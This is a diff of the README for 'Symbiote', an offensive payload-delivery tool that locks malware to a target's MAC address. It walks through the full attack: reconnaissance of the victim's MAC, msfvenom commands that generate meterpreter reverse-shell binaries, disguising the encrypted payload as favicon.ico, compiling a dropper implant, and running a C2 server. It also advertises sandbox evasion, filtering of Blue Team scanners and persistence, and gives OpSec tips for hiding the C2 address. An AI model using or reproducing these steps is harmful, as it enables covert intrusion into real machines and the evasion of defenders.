@@ -1,4 +1,4 @@
-#🦠 Symbiote: Environmental Keyed Payload Delivery
+# 🦠 Symbiote: Environmental Keyed Payload Delivery
 
 ![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
 ![C](https://img.shields.io/badge/C-Implant-A8B9CC?style=flat&logo=c)
@@ -28,57 +28,79 @@ graph TD
     E -->|Yes| F[Execute Payload]
     E -->|No| G[Crash / Garbage Data]
 ✨ Key Features
-🔒 Anti-Forensics / Sandbox Evasion: The payload is cryptographically locked to the specific hardware of the target. It cannot be analyzed offline without the victim's MAC address.
+🔒 Anti-Forensics / Sandbox Evasion: The payload is cryptographically locked to the specific hardware of the target.
 
 🐧 🪟 Cross-Platform Support: Single codebase supports both Windows (WinHTTP, ShellExecute) and Linux (Sockets, Fork/Setsid).
 
-👻 Daemonization: Implants automatically fork and detach from the terminal (setsid), redirecting IO to /dev/null to prevent "Session Died" errors and ensure persistence after the terminal closes.
+👻 Daemonization: Implants automatically fork and detach from the terminal (setsid), redirecting IO to /dev/null to ensure persistence.
 
 💾 Universal Dropper: Capable of dropping and executing any file type (ELF, EXE, Scripts), not just raw shellcode.
 
-🛡️ C2 Traffic Filtering: The delivery server rejects standard web crawlers and Blue Team scanners by enforcing strict User-Agent allow-listing.
+🛡️ C2 Traffic Filtering: The delivery server rejects standard web crawlers and Blue Team scanners.
 
-🛠️ Prerequisites
-Go (Golang): To run the builder and server.
+📦 Installation & Build
+Before using the tool, you must compile the Commander (Go CLI) on your attacker machine.
+
+Prerequisites
+Go (Golang): To build the commander tool.
 
 GCC / MinGW: To compile the C implant.
 
-Metasploit / MSFVenom: To generate the initial payloads (optional).
+Steps
+Clone the Repository:
+
+Bash
+
+git clone [https://github.com/YOUR_USERNAME/Project-Symbiote.git](https://github.com/YOUR_USERNAME/Project-Symbiote.git)
+cd Project-Symbiote
+Build the Tool:
+
+Bash
+
+# Initialize Go modules
+go mod tidy
+
+# If you are on Windows:
+go build -o symbiote.exe main.go
+
+# If you are on Linux/Mac:
+go build -o symbiote main.go
+You now have the executable CLI tool (symbiote.exe or symbiote) ready to use.
 
 🚀 Usage Guide
 1. Reconnaissance
 Obtain the MAC address of your target machine.
 
-Linux: ip link or ifconfig
+Linux: ip link or ifconfig (e.g., 08-8F-C3-12-3F-0E)
 
 Windows: ipconfig /all
 
 2. Payload Generation
 Generate a Stageless payload (recommended for stability).
 
-Linux:
+Linux Payload:
 
 Bash
 
-msfvenom -p linux/x64/meterpreter_reverse_tcp ... -f elf -o malware.elf
-Windows:
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o malware.elf
+Windows Payload:
 
 Bash
 
-msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f exe -o malware.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o malware.exe
 3. Weaponization (Encryption)
-Use the Symbiote CLI to lock the payload to the target.
+Use your compiled Symbiote tool to lock the payload to the target.
 
 Bash
 
 # Syntax: ./symbiote build --mac <TARGET_MAC> --input <PAYLOAD_FILE>
 
-# Example
-go run main.go build --mac 00-15-5D-01-CA-05 --input malware.elf
+# Example (Windows PowerShell)
+./symbiote.exe build --mac 08-8F-C3-12-3F-0E --input malware.elf
 Output: favicon.ico (Encrypted file)
 
 4. Compile the Implant
-Compile the C loader for your target OS.
+Compile the C loader for your target OS using GCC.
 
 For Linux Targets:
 
@@ -91,19 +113,23 @@ Bash
 
 gcc implant/implant.c -o implant.exe -lwinhttp -liphlpapi -lshell32
 5. Execution (The Attack)
-Terminal 1: Attacker (C2 Server) Start the delivery server.
+Terminal 1: Attacker (C2 Server) Start the delivery server using your tool.
 
 Bash
 
-go run main.go serve --port 8080
-Terminal 2: Victim (Implant) Run the implant, pointing it to the attacker's IP.
+# Windows
+./symbiote.exe serve --port 8080
+
+# Linux
+./symbiote serve --port 8080
+Terminal 2: Victim (Implant) Run the compiled implant, pointing it to the attacker's IP.
 
 Bash
 
 # ./implant <ATTACKER_IP> <PORT>
 ./implant-linux 192.168.1.50 8080
 ⚠️ Operational Security (OpSec) Notes
-Runtime Arguments: Currently, the C2 IP is passed via command line arguments for testing flexibility. In a real engagement, this would be hardcoded or patched into the binary to avoid process listing detection (ps aux).
+Runtime Arguments: Currently, the C2 IP is passed via command line arguments for testing flexibility. In a real engagement, this should be hardcoded or patched into the binary to avoid process listing detection (ps aux).
 
 Disk Drop: This tool acts as a Dropper (writes to %TEMP% or /tmp). While this ensures compatibility with complex binaries (ELF/EXE), it is less stealthy than pure in-memory injection.
 
